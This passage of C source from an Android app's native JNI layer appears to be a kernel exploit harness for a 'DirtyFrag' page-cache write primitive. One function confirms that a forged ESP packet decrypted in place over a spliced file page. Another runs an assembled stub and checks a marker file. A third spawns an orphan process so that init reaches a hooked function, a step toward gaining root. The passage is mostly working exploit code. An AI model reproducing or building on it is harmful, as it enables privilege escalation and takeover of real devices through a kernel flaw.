                "(fixed/backported code), the SA was not selected, or the packet "
                "never reached the ESP path.\n");
    } else {
        appendf(report, sizeof(report), &used,
                "5. Read back target: %zu of %d bytes changed; first difference at "
                "offset %zu (expected ESP payload layout)\n",
                changed, ESP_PROBE_BYTES, first_diff);
        appendf(report, sizeof(report), &used,
                "VERDICT: PAGE-CACHE WRITE OBSERVED. The kernel decrypted the forged "
                "ESP packet in place on top of a spliced file page.\n");
        appendf(report, sizeof(report), &used,
                "This establishes the DirtyFrag primitive on this build; it is not "
                "yet root and no system file was touched.\n");
    }

cleanup:
    if (write_fd >= 0) close(write_fd);
    if (file_fd >= 0) close(file_fd);
    if (tx_fd >= 0) close(tx_fd);
    if (pipe_fd[0] >= 0) close(pipe_fd[0]);
    if (pipe_fd[1] >= 0) close(pipe_fd[1]);
    if (created) {
        if (unlink(path) == 0) {
            appendf(report, sizeof(report), &used,
                    "Cleanup: app-private target removed; no system file was opened "
                    "for writing.\n");
        } else {
            appendf(report, sizeof(report), &used,
                    "Cleanup warning: unlink failed; errno=%d (%s)\n",
                    errno, strerror(errno));
        }
    }

    jstring result = (*env)->NewStringUTF(env, report);
    (*env)->ReleaseStringUTFChars(env, cache_dir_path, cache_dir);
    return result;
}

/* ---- stub self test ---------------------------------------------------- */

extern void p780_stub_test(void);

JNIEXPORT jstring JNICALL
Java_top_dcmqht_p780ipsec_MainActivity_runStubSelfTest(JNIEnv *env, jobject thiz) {
    (void)thiz;
    char report[1024] = {0};
    size_t used = 0;
    const char *marker =
            "/data/user/0/top.dcmqht.p780ipsec/cache/p780_stub_marker";

    unlink(marker);
    p780_stub_test();

    int fd = open(marker, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        appendf(report, sizeof(report), &used,
                "STUB SELF TEST: FAIL, marker not created (errno=%d %s)\n",
                errno, strerror(errno));
    } else {
        char buf[32] = {0};
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        appendf(report, sizeof(report), &used,
                "STUB SELF TEST: marker present, %zd bytes: %.*s\n",
                n, (int)(n > 0 ? n : 0), buf);
        if (n == 8 && memcmp(buf, "STUBTEST", 8) == 0) {
            appendf(report, sizeof(report), &used,
                    "RESULT: PASS - assembled stub executed and completed its syscalls\n");
        } else {
            appendf(report, sizeof(report), &used,
                    "RESULT: FAIL - marker content mismatch\n");
        }
        unlink(marker);
    }

    jstring result = (*env)->NewStringUTF(env, report);
    return result;
}

/* ---- orphan trigger ---------------------------------------------------- */

/* Double fork so the grandchild is reparented to init and then exits; init
 * reaps it in its main thread, which is where the hooked function is reached. */
JNIEXPORT jstring JNICALL
Java_top_dcmqht_p780ipsec_MainActivity_spawnOrphan(JNIEnv *env, jobject thiz) {
    (void)thiz;
    char report[256] = {0};
    size_t used = 0;
    pid_t child = fork();
    if (child < 0) {
        appendf(report, sizeof(report), &used, "fork failed: errno=%d\n", errno);
    } else if (child == 0) {
        pid_t grandchild = fork();
        if (grandchild == 0) {
            _exit(0);
        }
        _exit(0);
    } else {
        appendf(report, sizeof(report), &used,
                "orphan chain started (child pid %d)\n", (int)child);
    }
    jstring result = (*env)->NewStringUTF(env, report);
    return result;
}
